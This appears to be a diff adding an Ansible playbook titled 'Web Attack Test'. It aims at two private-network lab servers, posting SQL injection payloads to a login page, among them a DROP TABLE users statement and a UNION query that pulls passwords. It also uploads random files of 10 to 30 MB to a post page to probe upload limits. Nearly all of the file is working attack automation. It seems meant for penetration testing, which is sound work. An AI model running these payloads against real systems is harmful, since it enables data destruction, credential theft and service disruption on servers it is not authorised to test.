@@ -1,0 +1,108 @@
+---
+- name: Web Attack Test
+  hosts: localhost
+  gather_facts: no
+  
+  vars:
+    attack_servers:
+      - 192.168.56.107
+      - 192.168.56.106
+      
+    sql_payloads:
+      - "' OR 1=1--"
+      - "'; DROP TABLE users;--"
+      - "' UNION SELECT password FROM users--"
+
+    temp_directory: "/tmp"
+    output_directory: "{{ temp_directory }}/large_files"
+
+    file_sizes: 
+      - 10
+      - 20
+      - 30
+
+    form_data:
+      title: "Pentest Upload"
+      content: "Security test content"
+
+    timeout_seconds: 10
+
+  tasks:    
+    - name: Display SQL Injection Test Matrix
+      debug:
+        msg: "Target Server: {{ item.0 }} | SQL Payload: {{ item.1 }}"
+      loop: "{{ attack_servers | product(sql_payloads) | list }}"
+      
+    - name: Execute SQL Injection Attack Test
+      uri:
+        url: "http://{{ item.0 }}/login.php"
+        method: POST
+        body_format: form-urlencoded
+        body:
+          username: "{{ item.1 }}"
+          password: "test"
+        status_code: [200, 403, 500]
+        timeout: 5
+      register: sqli_test_results
+      loop: "{{ attack_servers | product(sql_payloads) | list }}"
+      ignore_errors: yes
+
+    - name: Display test information
+      debug:
+        msg: |
+          Large File Upload Security Test
+          Target: http://{{ attack_servers }}/post.php
+          Test Sizes: {{ file_sizes  | join('MB, ') }}MB
+
+    - name: Create temporary directory
+      file:
+        path: "{{ temp_directory }}/upload_test"
+        state: directory
+        mode: '0755'
+
+    - name: Clean existing test files
+      shell: "rm -f {{ temp_directory }}/upload_test/test_*mb.txt"
+      ignore_errors: yes
+
+    - name: "Create {{ item }}MB test file"
+      shell: |
+        echo "Creating {{ item }}MB test file..."
+        dd if=/dev/urandom of="{{ temp_directory }}/upload_test/test_{{ item }}mb.txt" bs=1M count={{ item }} 2>/dev/null
+        if [ $? -eq 0 ]; then
+          echo "File creation completed: test_{{ item }}mb.txt"
+          ls -lh "{{ temp_directory }}/upload_test/test_{{ item }}mb.txt"
+        else
+          echo "File creation failed"
+          exit 1
+        fi
+      loop: "{{ file_sizes }}"
+      register: file_creation_results
+
+    - name: Display file creation results
+      debug:
+        msg: |
+          ==========================================
+          File Size: {{ item.item }}MB
+          Creation Status: {{ 'SUCCESS' if item.rc == 0 else 'FAILED' }}
+          Output: {{ item.stdout_lines | join(' | ') }}
+          ==========================================
+      loop: "{{ file_creation_results.results }}"
+
+    - name: "Test upload for {{ item }}MB file"
+      uri:
+        url: "http://{{ attack_servers[0] }}/post.php"
+        method: POST
+        timeout: "{{ timeout_seconds }}"
+        body_format: form-multipart
+        body:
+          title: "{{ form_data.title }}"
+          content: "{{ form_data.content }}"
+          "attachments[]":
+            filename: "test_{{ item }}mb.txt"
+            content: "{{ lookup('file', temp_directory + '/upload_test/test_' + item|string + 'mb.txt') }}"
+            mime_type: "text/plain"
+        status_code: [200, 302, 400, 413, 500, 502, 503, 504]
+        return_content: yes
+      loop: "{{ file_sizes }}"
+      register: upload_results
+      ignore_errors: yes
